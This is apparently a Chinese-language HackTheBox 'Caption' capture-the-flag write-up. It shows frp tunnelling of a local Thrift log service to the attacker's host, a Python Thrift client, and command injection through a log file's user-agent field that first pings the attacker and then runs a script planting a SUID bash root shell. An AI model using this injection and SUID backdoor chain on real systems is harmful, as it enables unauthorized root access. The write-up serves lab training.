Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb  5 06:51:03 AM UTC 2025

  System load:  0.0               Processes:             234
  Usage of /:   74.3% of 8.76GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.10.11.33
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 10 12:33:42 2024 from 10.10.14.23
margo@caption:~$ whoami
margo
~~~

9090端口可能跑的logservice，尝试转发到本地

~~~
margo@caption:~/logs$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1315/python3        
tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN      1305/python3        
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1313/java           
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -              
~~~

使用frp转发到本地
~~~
┌──(kali㉿kali)-[~/htb/Caption/frp_0.61.1_linux_amd64]
└─$ cat frpc.toml 
# frpc.toml
[common]
server_addr = "10.10.16.4" 
server_port = 7000          
auth_token = "your_auth_token"  


[web] 
type = "tcp"
local_ip = "127.0.0.1"
local_port = 9090
remote_port = 9090  

~~~

~~~
┌──(kali㉿kali)-[~/htb/Caption/frp_0.61.1_linux_amd64]
└─$ cat frps.toml
# frps.toml
[common]
bind_port = 7000  # frp 服务端与客户端通信使用的端口

# 开启仪表板（可选）
dashboard_addr = "0.0.0.0"
dashboard_port = 7500
dashboard_user = "admin"
dashboard_pwd = "admin"

# 设置验证 token（用于安全连接）
auth_token = "your_auth_token"

~~~

把frpc上传到靶机，在本地运行frps，成功转发



thift是一个跨语言的框架，logservice中可以找到thrift的配置文件，所以尝试在本地建立一个thrift客户端与logservice通讯

需要服务端的.thrift文件

~~~log_service.thrift
    namespace go log_service
     
    service LogService {
        string ReadLogFile(1: string filePath)
    }
~~~

然后使用Thrift编译器生成目标语言的客户端代码。
~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Caption]
└─$ thrift -gen py log_service.thrift 
~~~

安装依赖
~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Caption]
└─$ pip install thrift

~~~

编写client.py

~~~
import sys
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService  # Import generated Thrift client code

def main():
    try:
        transport = TSocket.TSocket('localhost', 9090)
        transport = TTransport.TBufferedTransport(transport)
        protocol = TBinaryProtocol.TBinaryProtocol(transport)
        client = LogService.Client(protocol)
        transport.open()

        log_file_path = sys.argv[1]
        response = client.ReadLogFile(log_file_path)
        print("Server response:", response)
    except Thrift.TException as tx:
        print(f"Thrift exception: {tx}")
        import traceback
        traceback.print_exc()  # 打印完整的堆栈跟踪
    finally:
        transport.close()

if __name__ == '__main__':
    main()

~~~

写一个测试log并且上传到/tmp

~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Caption/gen-py]
└─$ cat ../frp_0.61.1_linux_amd64/lizi.log 
10.10.10.10 "user-agent":"test'; ping -c 1 10.10.16.4 #"

~~~

~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Caption/gen-py]
└─$ python client.py /tmp/lizi.log
~~~

在本地收到回应

~~~
┌──(kali㉿kali)-[~/htb/Caption/frp_0.61.1_linux_amd64]
└─$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:52:23.678622 IP 10.10.11.33 > 10.10.16.4: ICMP echo request, id 4, seq 1, length 64
04:52:23.678676 IP 10.10.16.4 > 10.10.11.33: ICMP echo reply, id 4, seq 1, length 64
04:52:31.612329 IP 10.10.11.33 > 10.10.16.4: ICMP echo request, id 5, seq 1, length 64
04:52:31.612340 IP 10.10.16.4 > 10.10.11.33: ICMP echo reply, id 5, seq 1, length 64

~~~

编写提权脚本

~~~
margo@caption:/tmp$ cat pe.sh 
cp /bin/bash /tmp/rootshell
chmod +sx /tmp/rootshell
~~~

用log触发执行

~~~
margo@caption:/tmp$ cat evil.log 
10.10.10.10 "user-agent":"test'; bash /tmp/pe.sh #"
~~~

成功提权

~~~
margo@caption:/tmp$ ./rootshell -p
rootshell-5.1# whoami
root

~~~


